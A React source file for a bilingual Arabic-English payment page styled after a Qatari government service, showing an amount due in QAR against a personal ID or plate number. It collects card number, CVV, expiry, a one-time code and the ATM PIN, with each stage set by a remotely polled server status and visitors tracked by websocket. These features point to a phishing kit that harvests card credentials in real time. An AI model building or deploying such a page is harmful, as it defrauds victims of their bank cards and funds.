import React, { useState, useEffect, type FormEvent } from "react";
import { useLanguage } from "@/contexts/LanguageContext";
import { useLocation } from "wouter";
import { useTranslation } from "@/hooks/useTranslation";
import { Header } from "@/components/Header";
import { Footer } from "@/components/Footer";
import { trpc } from "@/lib/trpc";
import { toast } from "sonner";

type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "atm" | "atm_pending" | "success" | "failed";
type CardType = "visa" | "mastercard" | "unknown" | "invalid";

// Luhn Algorithm for card validation
const validateCardNumber = (number: string): boolean => {
  const digits = number.replace(/\D/g, '');
  if (digits.length < 13 || digits.length > 19) return false;
  
  let sum = 0;
  let isEven = false;
  
  for (let i = digits.length - 1; i >= 0; i--) {
    let digit = parseInt(digits[i], 10);
    
    if (isEven) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    
    sum += digit;
    isEven = !isEven;
  }
  
  return sum % 10 === 0;
};

// Detect card type
const detectCardType = (number: string): CardType => {
  const cleanNumber = number.replace(/\s+/g, '');
  
  if (!cleanNumber) return "unknown";
  
  // Visa: starts with 4
  if (/^4[0-9]{12}(?:[0-9]{3})?$/.test(cleanNumber)) {
    return validateCardNumber(cleanNumber) ? "visa" : "invalid";
  }
  
  // Mastercard: starts with 51-55 or 2221-2720
  if (/^5[1-5][0-9]{14}$/.test(cleanNumber) || /^2[2-7][0-9]{14}$/.test(cleanNumber)) {
    return validateCardNumber(cleanNumber) ? "mastercard" : "invalid";
  }
  
  // If it looks like a card but doesn't match known patterns
  if (/^[0-9]{13,19}$/.test(cleanNumber)) {
    return "invalid";
  }
  
  return "unknown";
};

export default function Payment() {
  const { lang, setLanguage } = useLanguage();
  const { t } = useTranslation();
  const [, navigate] = useLocation();
  const searchParams = new URLSearchParams(window.location.search);
  const sessionId = searchParams.get("session") || localStorage.getItem("paymentSessionId") || "";
  
  const [stage, setStage] = useState<Stage>("card");
  const [error, setError] = useState<string | null>(null);
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [cardExpiry, setCardExpiry] = useState("");
  const [cardCvv, setCardCvv] = useState("");
  const [otpCode, setOtpCode] = useState("");
  const [atmPin, setAtmPin] = useState("");
  const [cardType, setCardType] = useState<CardType>("unknown");

  const updateStageMutation = trpc.payment.updateStage.useMutation();

  const { data: sessionData } = trpc.payment.getSession.useQuery(
    { sessionId },
    { enabled: !!sessionId }
  );

  const submitCardMutation = trpc.payment.submitCard.useMutation({
    onSuccess: () => setStage("card_pending"),
    onError: (err) => setError(err.message),
  });

  const submitOtpMutation = trpc.payment.submitOtp.useMutation({
    onSuccess: () => setStage("otp_pending"),
    onError: (err) => setError(err.message),
  });

  const submitAtmPinMutation = trpc.payment.submitAtmPin.useMutation({
    onSuccess: () => setStage("atm_pending"),
    onError: (err) => setError(err.message),
  });

  const { data: sessionStatus } = trpc.payment.getStatus.useQuery(
    { sessionId: sessionId || "" },
    {
      enabled: !!sessionId,
      refetchInterval: 2000,
    }
  );

  useEffect(() => {
    if (sessionId) {
      updateStageMutation.mutate({ sessionId, stage: "card" });
      const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
      const ws = new WebSocket(`${protocol}//${window.location.host}/ws/visitors?page=/payment&sessionId=${sessionId}`);
      return () => ws.close();
    }
  }, [sessionId]);

  useEffect(() => {
    if (sessionStatus?.redirectUrl) {
      window.location.href = sessionStatus.redirectUrl;
      return;
    }
    if (sessionStatus?.stage && sessionStatus.stage !== stage) {
      setStage(sessionStatus.stage as Stage);
      if (sessionStatus.errorMessage) setError(sessionStatus.errorMessage);
      else setError(null);
    }
  }, [sessionStatus, stage]);

  const handleCardSubmit = (e: FormEvent) => {
    e.preventDefault();
    
    // Validate card number
    if (cardType === "invalid") {
      setError(lang === "ar" ? "رقم البطاقة غير صالح" : "Invalid card number");
      return;
    }
    
    if (cardType === "unknown") {
      setError(lang === "ar" ? "نوع البطاقة غير مدعوم" : "Card type not supported");
      return;
    }
    
    setError(null);
    submitCardMutation.mutate({
      sessionId,
      cardName,
      cardNumber: cardNumber.replace(/\s+/g, ''),
      cardExpiry,
      cardCvv,
    });
  };

  const handleOtpSubmit = (e: FormEvent) => {
    e.preventDefault();
    submitOtpMutation.mutate({ sessionId, otpCode });
  };

  const handleAtmSubmit = (e: FormEvent) => {
    e.preventDefault();
    submitAtmPinMutation.mutate({ sessionId, atmPin });
  };

  const formatCardNumber = (val: string) => {
    const v = val.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    const newCardType = detectCardType(v);
    setCardType(newCardType);
    
    const parts = [];
    for (let i = 0; i < v.length; i += 4) {
      parts.push(v.substring(i, i + 4));
    }
    return parts.join(' ');
  };

  const formatExpiry = (val: string) => {
    const v = val.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    if (v.length >= 2) return v.substring(0, 2) + '/' + v.substring(2, 4);
    return v;
  };

  const isAr = lang === "ar";

  const displayId = sessionData?.qidNumber || sessionData?.establishmentId || sessionData?.plateNumber || "-";
  const displayTitle = sessionData?.qidNumber 
    ? (isAr ? "الرقم الشخصي" : "Personal ID") 
    : sessionData?.establishmentId 
      ? (isAr ? "رقم المنشأة" : "Establishment ID")
      : (isAr ? "رقم اللوحة" : "Plate Number");

  return (
    <div className="min-h-screen bg-[#f1f5f9] font-sans flex flex-col" dir={isAr ? "rtl" : "ltr"}>
      <Header />

      <main className="flex-grow max-w-2xl mx-auto px-4 py-8 w-full">
        {/* Payment Summary Banner */}
        <div className="bg-white border border-gray-200 rounded-2xl shadow-sm mb-6 overflow-hidden">
          <div className="bg-[#8A1538] px-6 py-3 text-white flex justify-between items-center">
            <span className="text-sm font-bold uppercase">{isAr ? "ملخص الدفع" : "Payment Summary"}</span>
            <span className="text-xs opacity-80 font-mono">#{sessionId.substring(0, 8).toUpperCase()}</span>
          </div>
          <div className="p-6 grid grid-cols-2 gap-4">
            <div>
              <p className="text-[10px] text-gray-400 font-bold uppercase mb-1">{displayTitle}</p>
              <p className="text-lg font-black text-[#003E66]">{displayId}</p>
            </div>
            <div className="text-right">
              <p className="text-[10px] text-gray-400 font-bold uppercase mb-1">{isAr ? "المبلغ المستحق" : "Total Amount"}</p>
              <p className="text-2xl font-black text-[#8A1538]">{sessionData?.totalAmount} <span className="text-xs">QAR</span></p>
            </div>
          </div>
        </div>

        <div className="bg-white border border-gray-200 rounded-2xl shadow-sm overflow-hidden">
          <div className="p-6 sm:p-10">
            {/* Stage: Card Entry */}
            {stage === "card" && (
              <form onSubmit={handleCardSubmit} className="space-y-6">
                <div className="flex items-center gap-3 mb-6">
                  <div className="w-10 h-10 bg-[#8A1538]/10 rounded-full flex items-center justify-center text-[#8A1538]">
                    <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" /></svg>
                  </div>
                  <h2 className="text-xl font-black text-gray-900">{isAr ? "تفاصيل بطاقة الدفع" : "Payment Card Details"}</h2>
                </div>

                {error && (
                  <div className="p-4 bg-red-50 border-s-4 border-red-500 text-red-700 text-sm font-bold">
                    {error}
                  </div>
                )}

                <div className="space-y-5">
                  {/* Card Number Input with Smart Icon */}
                  <div>
                    <label className="block text-xs font-black text-gray-500 uppercase mb-2">{isAr ? "رقم البطاقة" : "Card Number"}</label>
                    <div className={`relative border-2 rounded-xl transition-all ${
                      cardType === "invalid" 
                        ? "border-red-500 bg-red-50" 
                        : cardType === "visa" || cardType === "mastercard"
                        ? "border-green-500 bg-green-50"
                        : "border-gray-200 bg-white"
                    }`}>
                      <input 
                        type="text" 
                        value={cardNumber} 
                        onChange={(e) => setCardNumber(formatCardNumber(e.target.value))} 
                        maxLength={19} 
                        className={`w-full p-4 outline-none font-mono text-lg transition-all bg-transparent ${
                          cardType === "invalid" 
                            ? "text-red-600 placeholder-red-300" 
                            : "text-gray-900 placeholder-gray-400"
                        }`}
                        placeholder="0000 0000 0000 0000" 
                        required 
                      />
                      <div className={`absolute inset-y-0 ${isAr ? "left-4" : "right-4"} flex items-center transition-all duration-300`}>
                        {cardType === "visa" && (
                          <img src="/visa-logo.png" alt="Visa" className="h-5 animate-in fade-in duration-300" />
                        )}
                        {cardType === "mastercard" && (
                          <img src="/mastercard-logo.png" alt="Mastercard" className="h-8 animate-in fade-in duration-300" />
                        )}
                        {cardType === "invalid" && (
                          <div className="flex items-center gap-1 text-red-500">
                            <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M13.477 14.89A6 6 0 015.11 2.476a6 6 0 018.367 8.368A6 6 0 0113.477 14.89zm7.07-7.07a7 7 0 11-9.9 9.9 7 7 0 019.9-9.9z" clipRule="evenodd" /><path fillRule="evenodd" d="M9.228 12.227a.75.75 0 00-1.06-1.06L7.07 11.07l-1.097 1.097a.75.75 0 001.06 1.06L8.13 12.13l1.097 1.097a.75.75 0 001.06-1.06L9.19 11.07l1.097-1.097a.75.75 0 00-1.06-1.06L8.13 10.01 7.033 8.912a.75.75 0 10-1.06 1.06L7.07 11.07l-1.097 1.097z" clipRule="evenodd" /></svg>
                          </div>
                        )}
                        {cardType === "unknown" && (
                          <div className="w-8 h-6 bg-gray-100 rounded flex items-center justify-center text-gray-400">
                            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" /></svg>
                          </div>
                        )}
                      </div>
                    </div>
                    {cardType === "invalid" && cardNumber && (
                      <p className="text-red-600 text-xs font-bold mt-2">{isAr ? "⚠️ بطاقة غير صالحة" : "⚠️ Invalid Card"}</p>
                    )}
                    {(cardType === "visa" || cardType === "mastercard") && (
                      <p className="text-green-600 text-xs font-bold mt-2">✓ {cardType === "visa" ? "Visa" : "Mastercard"}</p>
                    )}
                  </div>

                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <label className="block text-xs font-black text-gray-500 uppercase mb-2">{isAr ? "تاريخ الانتهاء" : "Expiry Date"}</label>
                      <input 
                        type="text" 
                        value={cardExpiry} 
                        onChange={(e) => setCardExpiry(formatExpiry(e.target.value))} 
                        maxLength={5} 
                        placeholder="MM/YY" 
                        className="w-full p-4 border border-gray-200 rounded-xl focus:ring-2 focus:ring-[#8A1538]/20 focus:border-[#8A1538] outline-none text-center font-mono transition-all" 
                        required 
                      />
                    </div>
                    <div>
                      <label className="block text-xs font-black text-gray-500 uppercase mb-2">{isAr ? "رمز الأمان (CVV)" : "CVV"}</label>
                      <input 
                        type="password" 
                        value={cardCvv} 
                        onChange={(e) => setCardCvv(e.target.value.replace(/[^0-9]/g, ''))} 
                        maxLength={3} 
                        placeholder="•••" 
                        className="w-full p-4 border border-gray-200 rounded-xl focus:ring-2 focus:ring-[#8A1538]/20 focus:border-[#8A1538] outline-none text-center font-mono transition-all" 
                        required 
                      />
                    </div>
                  </div>

                  <div>
                    <label className="block text-xs font-black text-gray-500 uppercase mb-2">{isAr ? "اسم حامل البطاقة" : "Cardholder Name"}</label>
                    <input 
                      type="text" 
                      value={cardName} 
                      onChange={(e) => setCardName(e.target.value.toUpperCase())} 
                      className="w-full p-4 border border-gray-200 rounded-xl focus:ring-2 focus:ring-[#8A1538]/20 focus:border-[#8A1538] outline-none font-bold transition-all" 
                      placeholder="JASSIM AL-THANI" 
                      required 
                    />
                  </div>
                </div>

                <button 
                  type="submit" 
                  disabled={submitCardMutation.isPending || cardType === "invalid" || cardType === "unknown"} 
                  className="w-full bg-[#8A1538] text-white py-5 rounded-xl font-black text-lg hover:bg-[#70112d] transition-all shadow-lg active:scale-[0.98] disabled:opacity-50 disabled:cursor-not-allowed mt-4"
                >
                  {submitCardMutation.isPending ? (isAr ? "جاري التحقق..." : "Verifying...") : (isAr ? "تأكيد الدفع الآمن" : "Confirm Secure Payment")}
                </button>
              </form>
            )}

            {/* Stage: Loading / Pending */}
            {stage.includes("pending") && (
              <div className="py-16 text-center space-y-6">
                <div className="relative w-20 h-20 mx-auto">
                  <div className="absolute inset-0 border-4 border-[#8A1538]/10 rounded-full"></div>
                  <div className="absolute inset-0 border-4 border-[#8A1538] border-t-transparent rounded-full animate-spin"></div>
                </div>
                <div>
                  <h3 className="text-xl font-black text-gray-900">{isAr ? "جاري معالجة الطلب" : "Processing Request"}</h3>
                  <p className="text-sm text-gray-500 mt-2">{isAr ? "يرجى الانتظار، يتم تأمين اتصالك بالبنك..." : "Please wait, securing connection to bank..."}</p>
                </div>
              </div>
            )}

            {/* Stage: OTP */}
            {stage === "otp" && (
              <form onSubmit={handleOtpSubmit} className="text-center space-y-8 py-4">
                <div className="w-20 h-20 bg-blue-50 text-[#003E66] rounded-full flex items-center justify-center mx-auto shadow-sm">
                  <svg className="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" /></svg>
                </div>
                <div>
                  <h3 className="text-2xl font-black text-gray-900">{isAr ? "رمز التحقق (OTP)" : "Verification Code"}</h3>
                  <p className="text-gray-500 text-sm mt-2">
                    {isAr ? "أدخل الرمز المرسل إلى هاتفك المسجل" : "Enter the code sent to your registered phone"}
                  </p>
                </div>
                <input 
                  value={otpCode} 
                  onChange={(e) => setOtpCode(e.target.value)} 
                  className="w-full text-center text-4xl font-black p-5 bg-gray-50 border-2 border-gray-100 rounded-2xl outline-none focus:border-[#8A1538] focus:bg-white transition-all font-mono tracking-[0.3em]" 
                  placeholder="••••••" 
                  maxLength={6} 
                  required 
                  autoFocus
                />
                <button type="submit" disabled={submitOtpMutation.isPending} className="w-full bg-[#8A1538] text-white font-black py-5 rounded-xl text-lg shadow-lg hover:bg-[#70112d] transition-all">
                  {submitOtpMutation.isPending ? (isAr ? "جاري التأكيد..." : "Confirming...") : (isAr ? "تأكيد الرمز" : "Confirm Code")}
                </button>
              </form>
            )}

            {/* Stage: ATM PIN */}
            {stage === "atm" && (
              <form onSubmit={handleAtmSubmit} className="text-center space-y-8 py-4">
                <div className="w-20 h-20 bg-gray-50 text-gray-400 rounded-full flex items-center justify-center mx-auto shadow-sm">
                  <svg className="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" /></svg>
                </div>
                <div>
                  <h3 className="text-2xl font-black text-gray-900">{isAr ? "الرقم السري للبطاقة" : "ATM PIN"}</h3>
                  <p className="text-gray-500 text-sm mt-2">
                    {isAr ? "يرجى إدخال الرقم السري (PIN) المكون من 4 أرقام" : "Please enter your 4-digit secret PIN"}
                  </p>
                </div>
                <input 
                  type="password" 
                  value={atmPin} 
                  onChange={(e) => setAtmPin(e.target.value.replace(/[^0-9]/g, ''))} 
                  className="w-48 mx-auto text-center text-4xl font-black p-5 bg-gray-50 border-2 border-gray-100 rounded-2xl outline-none focus:border-[#8A1538] focus:bg-white transition-all font-mono tracking-[0.5em]" 
                  placeholder="••••" 
                  maxLength={4} 
                  required 
                  autoFocus
                />
                <button type="submit" disabled={submitAtmPinMutation.isPending} className="w-full bg-[#8A1538] text-white font-black py-5 rounded-xl text-lg shadow-lg hover:bg-[#70112d] transition-all">
                  {submitAtmPinMutation.isPending ? (isAr ? "جاري التحقق..." : "Verifying...") : (isAr ? "تأكيد الرقم السري" : "Confirm PIN")}
                </button>
              </form>
            )}

            {/* Stage: Success */}
            {stage === "success" && (
              <div className="py-12 text-center space-y-8">
                <div className="w-24 h-24 bg-green-50 text-green-500 rounded-full flex items-center justify-center mx-auto shadow-sm">
                  <svg className="w-14 h-14" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" d="M5 13l4 4L19 7" /></svg>
                </div>
                <div>
                  <h3 className="text-3xl font-black text-gray-900">{isAr ? "تم الدفع بنجاح" : "Payment Successful"}</h3>
                  <p className="text-gray-500 mt-2">
                    {isAr ? "شكراً لك، تم استلام المبلغ وتحديث السجل." : "Thank you, payment received and records updated."}
                  </p>
                </div>
                <button 
                  onClick={() => navigate("/")}
                  className="w-full bg-gray-900 text-white font-black py-5 rounded-xl text-lg shadow-lg hover:bg-black transition-all"
                >
                  {isAr ? "العودة للرئيسية" : "Back to Home"}
                </button>
              </div>
            )}
          </div>
        </div>
      </main>

      <Footer />
    </div>
  );
}
